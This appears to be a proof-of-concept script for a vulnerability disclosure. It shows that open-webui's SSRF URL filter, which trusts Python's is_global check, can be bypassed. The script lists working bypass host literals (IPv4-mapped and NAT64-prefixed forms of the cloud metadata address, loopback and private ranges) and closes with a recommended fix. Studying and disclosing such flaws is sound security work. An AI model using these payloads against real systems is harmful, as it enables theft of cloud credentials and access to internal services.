"""
PoC — SSRF filter insufficiency in open-webui v0.10.2
backend/open_webui/retrieval/web/utils.py :: validate_url()  (+ the identical
connect-time gates _ssrf_safe_new_conn / _SSRFSafeResolver)

The ENTIRE SSRF defense for user-supplied URLs (RAG /retrieval/process/web,
per-user webhooks, image-by-URL edit, etc.) rests on a single predicate:

    for ip in resolved_addresses:
        if not ipaddress.ip_address(ip).is_global:
            raise ValueError(INVALID_URL)      # block

i.e. "if every resolved IP is_global -> allow the fetch". This PoC shows two
classes of address that `is_global` reports as True (=> allowed) but that are
reachable as internal/metadata targets in real deployments. Because the same
predicate guards BOTH validate_url() and the connect-time resolver, a bypass
here defeats the DNS-rebinding protection too.

Run:  python poc_ssrf_isglobal.py
"""
import ipaddress
import sys

print(f"interpreter: CPython {sys.version.split()[0]}\n")

# The exact gate used by validate_url / _ssrf_safe_new_conn / _SSRFSafeResolver.
def is_allowed_by_openwebui(ip_str: str) -> bool:
    return ipaddress.ip_address(ip_str).is_global


CASES = [
    # (host literal an attacker can put in a URL, resolved IP the OS uses, note)
    ("169.254.169.254",              "169.254.169.254",           "baseline: cloud metadata (correctly blocked)"),
    ("[::ffff:169.254.169.254]",     "::ffff:169.254.169.254",    "IPv4-mapped IPv6 -> metadata (Python < 3.11.9/3.12.4)"),
    ("[::ffff:127.0.0.1]",           "::ffff:127.0.0.1",          "IPv4-mapped IPv6 -> loopback (Python < 3.11.9/3.12.4)"),
    ("[64:ff9b::169.254.169.254]",   "64:ff9b::a9fe:a9fe",        "NAT64 well-known prefix -> metadata (ALL current Python)"),
    ("[64:ff9b::10.0.0.1]",          "64:ff9b::a00:1",            "NAT64 well-known prefix -> RFC1918 (ALL current Python)"),
]

print(f"{'URL host literal':30} {'resolved IP':26} {'is_global':10} {'verdict'}")
print("-" * 95)
bypasses = []
for host, ip, note in CASES:
    allowed = is_allowed_by_openwebui(ip)
    verdict = "ALLOW (fetch proceeds)" if allowed else "block"
    if allowed and host != "169.254.169.254":
        bypasses.append((host, ip, note))
    print(f"{host:30} {ip:26} {str(allowed):10} {verdict}   # {note}")

# Prove the IPv4-mapped cases are *supposed* to be internal by unwrapping the
# embedded IPv4 — independent of the running interpreter's is_global result.
print("\nEmbedded-IPv4 reality check (what the address actually reaches):")
for host, ip, _ in CASES:
    a = ipaddress.ip_address(ip)
    mapped = getattr(a, "ipv4_mapped", None)
    if mapped is not None:
        klass = ("PRIVATE/loopback/link-local" if not mapped.is_global else "global")
        print(f"  {ip:26} -> embeds IPv4 {str(mapped):16} [{klass}]")

print("\nSUMMARY")
print("  * NAT64 (64:ff9b::/96) literals bypass is_global on EVERY current Python;")
print("    exploitable wherever the host has a NAT64/DNS64 gateway (common in")
print("    IPv6-only / dual-stack k8s and cloud networks) -> reaches 169.254.169.254.")
print("  * IPv4-mapped (::ffff:a.b.c.d) literals additionally bypass on the")
print("    python:3.11-slim base shipped before the gh-113171 fix (< 3.11.9),")
print("    reaching loopback / RFC1918 / metadata with no NAT64 needed.")
print("  Fix: don't trust is_global alone — reject IPv4-mapped & NAT64-embedded")
print("  addresses (unwrap and re-check the embedded IPv4), and reject any")
print("  non-global embedded v4, before allowing the fetch.")
